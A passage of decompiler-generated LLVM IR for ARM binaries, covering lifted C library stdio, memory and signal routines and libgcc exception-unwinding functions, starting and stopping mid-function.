  store i32 %v3_19c44, i32* %r3.global-to-local, align 4
  %v2_19c48 = add i32 %v0_19c44, 16
  %v3_19c48 = inttoptr i32 %v2_19c48 to i32*
  store i32 %v0_19c48, i32* %v3_19c48, align 4
  %v0_19c4c = load i32, i32* %r3.global-to-local, align 4
  %v1_19c4c = load i32, i32* %r2.global-to-local, align 4
  %v2_19c4c = sub i32 %v1_19c4c, %v0_19c4c
  store i32 %v2_19c4c, i32* %r3.global-to-local, align 4
  %v1_19c50 = load i32, i32* @r5, align 4
  %v2_19c50 = sub i32 %v1_19c50, %v2_19c4c
  br label %dec_label_pc_19c54

dec_label_pc_19c54:                               ; preds = %dec_label_pc_19c00, %dec_label_pc_19c44
  %v0_19c54 = phi i32 [ %v2_19c50, %dec_label_pc_19c44 ], [ %v0_19c54.pre, %dec_label_pc_19c00 ]
  %v1_19c54 = load i32, i32* @r7, align 4
  %v2_19c54 = sub i32 %v1_19c54, %v0_19c54
  store i32 %v2_19c54, i32* @r7, align 4
  br label %dec_label_pc_19c64

dec_label_pc_19c5cthread-pre-split:               ; preds = %dec_label_pc_19bb4
  %v3_19bcc = load i32, i32* @r6, align 4
  %v5_19bcc = add i32 %v3_19bcc, %v3_19bc4
  store i32 %v5_19bcc, i32* @r6, align 4
  %v4_19bd0 = load i32, i32* @r5, align 4
  %v5_19bd0 = sub i32 %v4_19bd0, %v3_19bc4
  store i32 %v5_19bd0, i32* @r5, align 4
  %v2_19c5c = icmp eq i32 %v5_19bd0, 0
  store i1 %v2_19c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c5c, label %dec_label_pc_19c64, label %dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge

dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge: ; preds = %dec_label_pc_19c5cthread-pre-split
  %v3_19bb4.pre = load i32, i32* @r8, align 4
  %v0_19bc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19bb4

dec_label_pc_19c64:                               ; preds = %dec_label_pc_19c5cthread-pre-split, %entry, %bb21, %dec_label_pc_19c54
  %v0_19c64 = load i32, i32* @r7, align 4
  ret i32 %v0_19c64

; uselistorder directives
  uselistorder i32 %v5_19bd0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_19bcc, { 1, 0 }
  uselistorder i32 %v0_19c44, { 1, 0 }
  uselistorder i32 %v1_19c3c, { 0, 2, 1 }
  uselistorder i32 %v0_19c38, { 1, 0 }
  uselistorder i32 %v0_19c54.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_19c04, { 1, 0, 2 }
  uselistorder i32 %v2_19c04, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_19bc4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_19bbc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 4, 5, 0, 6, 1, 2, 3 }
  uselistorder i32 11, { 12, 9, 10, 11, 22, 32, 33, 0, 13, 14, 15, 16, 2, 17, 3, 18, 4, 19, 20, 21, 23, 24, 5, 25, 6, 26, 1, 27, 7, 28, 29, 30, 8, 31, 34 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19c64, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_19c54, { 1, 0 }
  uselistorder label %dec_label_pc_19c44, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19c00, { 1, 0 }
  uselistorder label %dec_label_pc_19bb4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19c74 = load i32, i32* @r4, align 4
  store i32 %v3_19c74, i32* %stack_var_-8, align 4
  %v1_19c78 = add i32 %arg1, 8
  %v1_19c7c = inttoptr i32 %v1_19c78 to i32*
  %v2_19c7c = load i32, i32* %v1_19c7c, align 4
  store i32 %v2_19c7c, i32* @r1, align 4
  %v3_19c7c = add i32 %arg1, 12
  %v4_19c7c = inttoptr i32 %v3_19c7c to i32*
  %v5_19c7c = load i32, i32* %v4_19c7c, align 4
  %v2_19c80 = sub i32 %v5_19c7c, %v2_19c7c
  store i32 %v2_19c80, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19c88 = inttoptr i32 %arg1 to i16*
  %v4_19c88 = call i32 @__stdio_READ(i16* %v3_19c88, i32 %v2_19c7c, i32 %v2_19c80)
  %v0_19c8c = load i32, i32* @r4, align 4
  %v1_19c8c = add i32 %v0_19c8c, 8
  %v2_19c8c = inttoptr i32 %v1_19c8c to i32*
  %v3_19c8c = load i32, i32* %v2_19c8c, align 4
  store i32 %v3_19c8c, i32* %r2.global-to-local, align 4
  %v2_19c90 = add i32 %v3_19c8c, %v4_19c88
  %v2_19c94 = add i32 %v0_19c8c, 20
  %v3_19c94 = inttoptr i32 %v2_19c94 to i32*
  store i32 %v2_19c90, i32* %v3_19c94, align 4
  %v0_19c98 = load i32, i32* %r2.global-to-local, align 4
  %v1_19c98 = load i32, i32* @r4, align 4
  %v2_19c98 = add i32 %v1_19c98, 16
  %v3_19c98 = inttoptr i32 %v2_19c98 to i32*
  store i32 %v0_19c98, i32* %v3_19c98, align 4
  %v2_19c9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19c9c, i32* @r4, align 4
  ret i32 %v4_19c88

; uselistorder directives
  uselistorder i32 %v4_19c88, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19ca4 = load i32, i32* @r4, align 4
  store i32 %v3_19ca4, i32* %stack_var_-12, align 4
  %v0_19ca8 = load i32, i32* @r0, align 4
  %v1_19ca8 = inttoptr i32 %v0_19ca8 to i16*
  %v2_19ca8 = load i16, i16* %v1_19ca8, align 2
  %v3_19ca8 = zext i16 %v2_19ca8 to i32
  store i32 %v3_19ca8, i32* %r3.global-to-local, align 4
  %v0_19cac = load i32, i32* @r1, align 4
  %v2_19cac = and i32 %v0_19cac, %v3_19ca8
  %v4_19cac = icmp eq i32 %v2_19cac, 0
  store i32 %v0_19ca8, i32* @r4, align 4
  br i1 %v4_19cac, label %dec_label_pc_19cbc, label %dec_label_pc_19ccc

dec_label_pc_19cbc:                               ; preds = %entry
  %v1_19cbc = and i32 %v3_19ca8, 2176
  %v2_19cbc = icmp eq i32 %v1_19cbc, 0
  br i1 %v2_19cbc, label %dec_label_pc_19cc4, label %dec_label_pc_19cd8

dec_label_pc_19cc4:                               ; preds = %dec_label_pc_19cbc
  %v2_19cc4 = or i32 %v0_19cac, %v3_19ca8
  store i32 %v2_19cc4, i32* %r3.global-to-local, align 4
  %v1_19cc8 = trunc i32 %v2_19cc4 to i16
  store i16 %v1_19cc8, i16* %v1_19ca8, align 2
  %v0_19ccc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19ccc

dec_label_pc_19ccc:                               ; preds = %entry, %dec_label_pc_19cc4
  %v0_19ccc = phi i32 [ %v0_19ca8, %entry ], [ %v0_19ccc.pre, %dec_label_pc_19cc4 ]
  %v1_19ccc = inttoptr i32 %v0_19ccc to i16*
  %v2_19ccc = load i16, i16* %v1_19ccc, align 2
  %v3_19ccc = zext i16 %v2_19ccc to i32
  store i32 %v3_19ccc, i32* %r3.global-to-local, align 4
  %v1_19cd0 = and i32 %v3_19ccc, 16
  store i32 %v1_19cd0, i32* %r5.global-to-local, align 4
  %v2_19cd0 = icmp eq i32 %v1_19cd0, 0
  br i1 %v2_19cd0, label %dec_label_pc_19d00, label %dec_label_pc_19cd8

dec_label_pc_19cd8:                               ; preds = %dec_label_pc_19cbc, %dec_label_pc_19ccc
  store i32 42984, i32* %r3.global-to-local, align 4
  %v0_19cdc = call i32 @__aeabi_read_tp()
  store i32 %v0_19cdc, i32* %r0.global-to-local, align 4
  %v3_19ce0 = load i16, i16* @global_var_244d0.762, align 2
  %v4_19ce0 = sext i16 %v3_19ce0 to i32
  store i32 %v4_19ce0, i32* %r3.global-to-local, align 4
  %v3_19ce8 = add i32 %v4_19ce0, %v0_19cdc
  %v4_19ce8 = inttoptr i32 %v3_19ce8 to i32*
  store i32 9, i32* %v4_19ce8, align 4
  br label %dec_label_pc_19cec

dec_label_pc_19cec:                               ; preds = %dec_label_pc_19d08, %dec_label_pc_19cd8
  %v0_19cec = load i32, i32* @r4, align 4
  %v1_19cec = inttoptr i32 %v0_19cec to i16*
  %v2_19cec = load i16, i16* %v1_19cec, align 2
  %v3_19cec = zext i16 %v2_19cec to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_19cf4 = or i32 %v3_19cec, 8
  store i32 %v1_19cf4, i32* %r3.global-to-local, align 4
  %v1_19cf8 = trunc i32 %v1_19cf4 to i16
  store i16 %v1_19cf8, i16* %v1_19cec, align 2
  %v1_19d40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19d38

dec_label_pc_19d00:                               ; preds = %dec_label_pc_19ccc
  %v1_19d00 = and i32 %v3_19ccc, 64
  %v2_19d00 = icmp eq i32 %v1_19d00, 0
  br i1 %v2_19d00, label %dec_label_pc_19d28, label %dec_label_pc_19d08

dec_label_pc_19d08:                               ; preds = %dec_label_pc_19d00
  %v0_19d08 = load i32, i32* @r0, align 4
  %v1_19d08 = call i32 @__stdio_wcommit(i32 %v0_19d08)
  store i32 %v1_19d08, i32* %r0.global-to-local, align 4
  %v2_19d0c = icmp eq i32 %v1_19d08, 0
  br i1 %v2_19d0c, label %dec_label_pc_19d14, label %dec_label_pc_19cec

dec_label_pc_19d14:                               ; preds = %dec_label_pc_19d08
  %v0_19d14 = load i32, i32* @r4, align 4
  %v1_19d14 = inttoptr i32 %v0_19d14 to i16*
  %v2_19d14 = load i16, i16* %v1_19d14, align 2
  %v3_19d14 = zext i16 %v2_19d14 to i32
  store i32 %v3_19d14, i32* %r3.global-to-local, align 4
  %v1_19d18 = add i32 %v0_19d14, 8
  %v2_19d18 = inttoptr i32 %v1_19d18 to i32*
  %v3_19d18 = load i32, i32* %v2_19d18, align 4
  %v1_19d1c = and i32 %v3_19d14, 65471
  store i32 %v1_19d1c, i32* %r3.global-to-local, align 4
  %v2_19d20 = add i32 %v0_19d14, 28
  %v3_19d20 = inttoptr i32 %v2_19d20 to i32*
  store i32 %v3_19d18, i32* %v3_19d20, align 4
  %v0_19d24 = load i32, i32* %r3.global-to-local, align 4
  %v1_19d24 = trunc i32 %v0_19d24 to i16
  %v2_19d24 = load i32, i32* @r4, align 4
  %v3_19d24 = inttoptr i32 %v2_19d24 to i16*
  store i16 %v1_19d24, i16* %v3_19d24, align 2
  %v0_19d28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19d28

dec_label_pc_19d28:                               ; preds = %dec_label_pc_19d00, %dec_label_pc_19d14
  %v2_19d30 = phi i32 [ %v0_19ccc, %dec_label_pc_19d00 ], [ %v0_19d28.pre, %dec_label_pc_19d14 ]
  %v1_19d28 = inttoptr i32 %v2_19d30 to i16*
  %v2_19d28 = load i16, i16* %v1_19d28, align 2
  %v3_19d28 = zext i16 %v2_19d28 to i32
  %v1_19d2c = or i32 %v3_19d28, 1
  store i32 %v1_19d2c, i32* %r3.global-to-local, align 4
  %v1_19d30 = trunc i32 %v1_19d2c to i16
  store i16 %v1_19d30, i16* %v1_19d28, align 2
  %v0_19d34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19d34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19d38

dec_label_pc_19d38:                               ; preds = %dec_label_pc_19cec, %dec_label_pc_19d28
  %v1_19d40 = phi i32 [ %v1_19d40.pre, %dec_label_pc_19cec ], [ %v0_19d34, %dec_label_pc_19d28 ]
  %v2_19d3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19d3c, i32* @r4, align 4
  ret i32 %v1_19d40

; uselistorder directives
  uselistorder i32 %v3_19ca8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19d38, { 1, 0 }
  uselistorder label %dec_label_pc_19d28, { 1, 0 }
  uselistorder label %dec_label_pc_19cd8, { 1, 0 }
  uselistorder label %dec_label_pc_19ccc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_19d48 = load i32, i32* @r4, align 4
  %v6_19d48 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19d58 = call i32 @memcpy()
  %v0_19d5c = load i32, i32* @r5, align 4
  %v1_19d5c = load i32, i32* @r4, align 4
  %v2_19d5c = add i32 %v1_19d5c, %v0_19d5c
  store i32 %v3_19d48, i32* @r4, align 4
  store i32 %v6_19d48, i32* @r5, align 4
  ret i32 %v2_19d5c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_19d6c = load i32, i32* @r1, align 4
  %v2_19d6c = icmp eq i32 %v0_19d6c, 0
  %v3_19d70 = load i32, i32* @r4, align 4
  store i32 %v3_19d70, i32* %stack_var_-8, align 4
  %v0_19d74 = load i32, i32* @r0, align 4
  store i32 %v0_19d74, i32* %r4.global-to-local, align 4
  br i1 %v2_19d6c, label %dec_label_pc_19d98, label %dec_label_pc_19d7c

dec_label_pc_19d7c:                               ; preds = %entry
  %v1_19d84 = add i32 %v0_19d74, 260
  %v4_19d88 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_19d84)
  %v2_19d8c = icmp eq i32 %v4_19d88, 0
  br i1 %v2_19d8c, label %dec_label_pc_19d9c, label %dec_label_pc_19d98

dec_label_pc_19d98:                               ; preds = %dec_label_pc_19d7c, %entry
  br label %dec_label_pc_19d9c

dec_label_pc_19d9c:                               ; preds = %dec_label_pc_19d7c, %dec_label_pc_19d98
  %storemerge = phi i32 [ 0, %dec_label_pc_19d98 ], [ 1, %dec_label_pc_19d7c ]
  %v1_19da0 = load i32, i32* %r4.global-to-local, align 4
  %v2_19da0 = add i32 %v1_19da0, 256
  %v3_19da0 = inttoptr i32 %v2_19da0 to i32*
  store i32 %storemerge, i32* %v3_19da0, align 4
  %v2_19da4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19da4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 11, 0, 4, 5, 1, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 8, 27, 28, 29, 30, 31, 3, 32, 33, 34, 37, 35, 36, 50, 38, 10, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 49 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_19d9c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_19df4, label %dec_label_pc_19dd8

dec_label_pc_19dd8:                               ; preds = %entry
  %v0_19ddc = call i32 @__aeabi_read_tp()
  %v3_19de0 = load i16, i16* @global_var_244d0.762, align 2
  %v4_19de0 = sext i16 %v3_19de0 to i32
  %v0_19de4 = load i32, i32* %r2.global-to-local, align 4
  %v1_19de4 = sub i32 0, %v0_19de4
  store i32 %v1_19de4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19dec = add i32 %v4_19de0, %v0_19ddc
  %v4_19dec = inttoptr i32 %v3_19dec to i32*
  store i32 %v1_19de4, i32* %v4_19dec, align 4
  %v0_19dfc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19dfc

dec_label_pc_19df4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_19df4 = icmp eq i32 %arg1, 0
  br i1 %v2_19df4, label %dec_label_pc_19e08, label %dec_label_pc_19dfc

dec_label_pc_19dfc:                               ; preds = %dec_label_pc_19df4, %dec_label_pc_19dd8
  %v0_19dfc = phi i32 [ %arg1, %dec_label_pc_19df4 ], [ %v0_19dfc.pre, %dec_label_pc_19dd8 ]
  %v3_19e00 = ashr i32 %v0_19dfc, 31
  br label %dec_label_pc_19e0c

dec_label_pc_19e08:                               ; preds = %dec_label_pc_19df4
  br label %dec_label_pc_19e0c

dec_label_pc_19e0c:                               ; preds = %dec_label_pc_19dfc, %dec_label_pc_19e08
  %v1_19e14 = phi i32 [ %v0_19dfc, %dec_label_pc_19dfc ], [ %tmp8, %dec_label_pc_19e08 ]
  %storemerge = phi i32 [ %v3_19e00, %dec_label_pc_19dfc ], [ %tmp, %dec_label_pc_19e08 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_19e14

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 9, 4, 5, 11, 0, 6, 1, 7, 2, 8, 10, 3 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_244d0.762, { 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 66, 72, 71, 65, 64, 28, 27, 69, 70, 68, 67, 26, 25, 77, 76, 75, 74, 73, 37, 24, 23, 36, 63, 50, 49, 12, 6, 5, 11, 22, 21, 10, 3, 2, 35, 9, 8, 7, 60, 20, 19, 18, 15, 17, 16, 59, 58, 34, 33, 38, 32, 39, 31, 51, 30, 57, 29, 40, 56, 14, 62, 61, 48, 45, 44, 43, 4, 55, 13, 42, 54, 41, 53, 52, 0, 1, 47, 46 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_19e0c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19e1c = icmp eq i32 %regclass, 0
  br i1 %v2_19e1c, label %dec_label_pc_19e24, label %dec_label_pc_19e54

dec_label_pc_19e24:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19e24
  %v6_19e28 = icmp eq i32 %representation, 0
  br i1 %v6_19e28, label %dec_label_pc_19e38, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19e24
  br label %dec_label_pc_19e60

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19e60

dec_label_pc_19e38:                               ; preds = %bb
  %v3_19e38 = mul i32 %regno, 4
  %v2_19e3c = add i32 %v3_19e38, %context
  %v1_19e40 = add i32 %v2_19e3c, 4
  %v2_19e40 = inttoptr i32 %v1_19e40 to i32*
  %v3_19e40 = load i32, i32* %v2_19e40, align 4
  %v2_19e4c = bitcast i8* %valuep to i32*
  store i32 %v3_19e40, i32* %v2_19e4c, align 4
  ret i32 0

dec_label_pc_19e54:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19e54
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19e54, %bb9
  %v0_19e5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19e5c)
  br label %dec_label_pc_19e60

dec_label_pc_19e60:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19e60, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19e68 = icmp eq i32 %regclass, 0
  br i1 %v2_19e68, label %dec_label_pc_19e70, label %dec_label_pc_19ea0

dec_label_pc_19e70:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19e70
  %v6_19e74 = icmp eq i32 %representation, 0
  br i1 %v6_19e74, label %dec_label_pc_19e84, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19e70
  br label %dec_label_pc_19eac

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19eac

dec_label_pc_19e84:                               ; preds = %bb
  %v3_19e88 = mul i32 %regno, 4
  %v1_19e8c = bitcast i8* %valuep to i32*
  %v2_19e8c = load i32, i32* %v1_19e8c, align 4
  %v2_19e90 = add i32 %v3_19e88, %context
  %v2_19e98 = add i32 %v2_19e90, 4
  %v3_19e98 = inttoptr i32 %v2_19e98 to i32*
  store i32 %v2_19e8c, i32* %v3_19e98, align 4
  ret i32 0

dec_label_pc_19ea0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19ea0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19ea0, %bb9
  %v0_19ea8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19ea8)
  br label %dec_label_pc_19eac

dec_label_pc_19eac:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19eac, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_19eb4 = add i32 %context, 68
  %v2_19eb4 = inttoptr i32 %v1_19eb4 to i32*
  %v3_19eb4 = load i32, i32* %v2_19eb4, align 4
  ret i32 %v3_19eb4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_19ec4 = add i32 %exc, 8
  %v2_19ec4 = inttoptr i32 %v1_19ec4 to i32*
  %v3_19ec4 = load i32, i32* %v2_19ec4, align 4
  %v2_19ec8 = icmp eq i32 %v3_19ec4, 0
  br i1 %v2_19ec8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_19edc = xor i1 %v2_19ec8, true
  call void @__pseudo_cond_branch(i1 %v2_19edc, i32 %v3_19ec4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19ef4 = call i32 @abort()
  ret i32 %v0_19ef4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19f00 = call i32 @abort()
  ret i32 %v0_19f00
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19f04 = load i32, i32* @r4, align 4
  store i32 %v3_19f04, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r5.global-to-local, align 4
  %v4_19f14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 132) to i32*), align 4
  %v2_19f18 = icmp eq i32 %v4_19f14, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_19f24 = add i32 %return_address, -2
  store i32 %v1_19f24, i32* %r4.global-to-local, align 4
  br i1 %v2_19f18, label %dec_label_pc_19f5c, label %dec_label_pc_19f2c

dec_label_pc_19f2c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_19f14)
  %v2_19f3c = icmp eq i32 %v1_19f24, 0
  br i1 %v2_19f3c, label %.thread, label %dec_label_pc_19f7cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_19f2c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_19f44 = load i32, i32* %r6.global-to-local, align 4
  %v3_19f44 = add i32 %v2_19f44, 16
  %v4_19f44 = inttoptr i32 %v3_19f44 to i32*
  store i32 0, i32* %v4_19f44, align 4
  br label %dec_label_pc_19f4c

dec_label_pc_19f4c:                               ; preds = %.thread, %.thread10, %dec_label_pc_1a0f4, %dec_label_pc_1a0e0, %dec_label_pc_1a0bc, %dec_label_pc_1a094, %dec_label_pc_19f94
  %v0_19f4c = load i32, i32* %r2.global-to-local, align 4
  %v2_19f54 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_19f54, i32* @r4, align 4
  ret i32 %v0_19f4c

dec_label_pc_19f5c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_19f64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 20) to i32*), align 4
  %v4_19f68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 48) to i32*), align 4
  store i32 %v4_19f68, i32* %r2.global-to-local, align 4
  %v2_19f6c = sub i32 %v4_19f64, %v4_19f68
  %v3_19f70 = sdiv i32 %v2_19f6c, 8
  store i32 %v3_19f70, i32* %stack_var_-36, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_19f7cthread-pre-split:               ; preds = %dec_label_pc_19f2c
  %v3_19f7c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_19f7c:                               ; preds = %dec_label_pc_19f7cthread-pre-split, %dec_label_pc_19f5c
  %v0_19fc0.pre = phi i32 [ %v1_19f24, %dec_label_pc_19f7cthread-pre-split ], [ %v4_19f68, %dec_label_pc_19f5c ]
  %v1_19f84 = phi i32 [ %v3_19f7c.pr, %dec_label_pc_19f7cthread-pre-split ], [ %v3_19f70, %dec_label_pc_19f5c ]
  %v2_19f80 = icmp eq i32 %v1_19f84, 0
  br i1 %v2_19f80, label %dec_label_pc_19f94, label %dec_label_pc_19fb0.preheader

dec_label_pc_19fb0.preheader:                     ; preds = %dec_label_pc_19f7c
  %v2_19f84 = add i32 %v1_19f84, -1
  %v1_19fe0 = add i32 %v0_19fc0.pre, 8
  br label %dec_label_pc_19fb0.outer

dec_label_pc_19f94.loopexit:                      ; preds = %dec_label_pc_1a00c
  br label %dec_label_pc_19f94

dec_label_pc_19f94:                               ; preds = %dec_label_pc_19f94.loopexit, %dec_label_pc_19f7c, %dec_label_pc_1a0d8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_19f9c = load i32, i32* %r6.global-to-local, align 4
  %v2_19f9c = add i32 %v1_19f9c, 16
  %v3_19f9c = inttoptr i32 %v2_19f9c to i32*
  store i32 0, i32* %v3_19f9c, align 4
  br label %dec_label_pc_19f4c

dec_label_pc_19fa4:                               ; preds = %dec_label_pc_1a000
  %v3_19fa4 = icmp ult i32 %storemerge40, %v0_1a004
  br i1 %v3_19fa4, label %dec_label_pc_19fac, label %dec_label_pc_1a01c

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19fa4
  %v1_19fac = add nsw i32 %v3_19fb8, 1
  br label %dec_label_pc_19fb0.outer

dec_label_pc_19fb0.outer:                         ; preds = %dec_label_pc_19fac, %dec_label_pc_19fb0.preheader
  %v1_1a00c.ph = phi i32 [ %v1_19fac, %dec_label_pc_19fac ], [ 0, %dec_label_pc_19fb0.preheader ]
